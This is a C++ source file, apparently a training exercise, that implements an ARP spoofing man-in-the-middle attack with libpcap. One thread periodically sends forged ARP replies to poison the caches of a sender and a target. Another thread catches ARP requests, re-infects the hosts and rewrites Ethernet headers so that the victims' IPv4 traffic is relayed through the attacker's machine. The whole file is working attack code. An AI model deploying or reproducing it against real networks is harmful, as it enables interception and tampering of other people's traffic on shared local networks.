
#include <pcap.h>
#include <stdio.h>
#include <sys/socket.h>
#include <stdint.h>
#include <sys/ioctl.h>
#include <map>
#include <linux/if.h>
#include <netdb.h>
#include <string.h>
#include <pthread.h>
#include <unistd.h>
#include <time.h>

#include "attack.hpp"
#include "attack_util.hpp"

using namespace std;

map<Ip, Mac> IpMacMap;
map<Ip, Ip> ST_IP_map;

char is_thread_run = 0;


void initialize_attack_thread() {
    is_thread_run = 1;
}

void terminate_attack_thread() {
    is_thread_run = 0;
}

void _arp_infect(pcap_t *send_handle, Mac my_mac, Mac sender_mac, Ip sender_ip, Mac target_mac, Ip target_ip) {
    /* infection */
    ERR_CHK (
        send_arp_packet, 
        (send_handle, ArpHdr::Reply, sender_mac, my_mac, sender_mac, target_ip,sender_ip), 
        return;
    )

    ERR_CHK (
        send_arp_packet,
        (send_handle, ArpHdr::Reply, target_mac, my_mac, target_mac, sender_ip, target_ip), 
        return;
    )
}


void *arpinfect_proc(void *arg) {
    arp_info_st *arp_info = (arp_info_st*)arg;

    int start = time(0);
    while(is_thread_run) {
        
        if(time(0) - start < ARP_TIME_SEC) { sleep(1); continue; }
        start = time(0);
        _arp_infect(arp_info->send_handle, arp_info->my_mac, arp_info->sender_mac, arp_info->sender_ip, arp_info->target_mac, arp_info->target_ip); 
    }

    return NULL;
}


int is_exists_ST_pair(Ip a, Ip b) {
    if(ST_IP_map.find(a) != ST_IP_map.end() && ST_IP_map[a] == b)
        return 1;
    return 0;
}
void *spoof_proc(void *arg) {
    arp_info_st *arp_info = (arp_info_st*)arg;

    pcap_pkthdr *pkt_header;
    u_char *pkt_data;

    int res;

    while(is_thread_run) {
        ERR_CHK (
            read_packet, 
            (arp_info->recv_handle, &pkt_header, &pkt_data), 
            break;
        )

        EthArpPacket *etharp = (EthArpPacket*)pkt_data;

        //Catch request ARP
        if(etharp->eth_.type_ == EthHdr::Arp && etharp->arp_.op() == ArpHdr::Request && is_exists_ST_pair(etharp->arp_.sip(), etharp->arp_.tip())) {
            _arp_infect(arp_info->send_handle, arp_info->my_mac, IpMacMap[etharp->arp_.sip()], etharp->arp_.sip(), IpMacMap[etharp->arp_.tip()], etharp->arp_.tip()); 
            
        } else if (etharp->eth_.type() == EthHdr::Ip4 && !etharp->eth_.dmac().isBroadcast()) {
            //relay
            custom_libnet_ipv4_hdr *ipv4_hdr = (custom_libnet_ipv4_hdr*)(pkt_data + sizeof(EthHdr));
            Ip t_ip = Ip("0.0.0.0");
            if(ST_IP_map.find(ipv4_hdr->sip()) !=  ST_IP_map.end() )
               t_ip = ST_IP_map[ipv4_hdr->sip()];
            if(ST_IP_map.find(ipv4_hdr->dip()) !=  ST_IP_map.end() )
               t_ip = ipv4_hdr->dip(); // Destination must be maintained


            if(t_ip != Ip("0.0.0.0")) { // If it existed, It would be set
                etharp->eth_.smac_ = arp_info->my_mac;
                etharp->eth_.dmac_ = IpMacMap[t_ip];
                ERR_CHK (
                    safe_send_packet,
                    (arp_info->send_handle, pkt_data, pkt_header->caplen),
                    break;
            )
            }
        }
        free((void*)pkt_header); pkt_header = NULL;
        free((void*)pkt_data); pkt_data = NULL;
    }

    if(pkt_header) free((void*)pkt_header);
    if(pkt_data) free((void*)pkt_data);

    return NULL;
    
}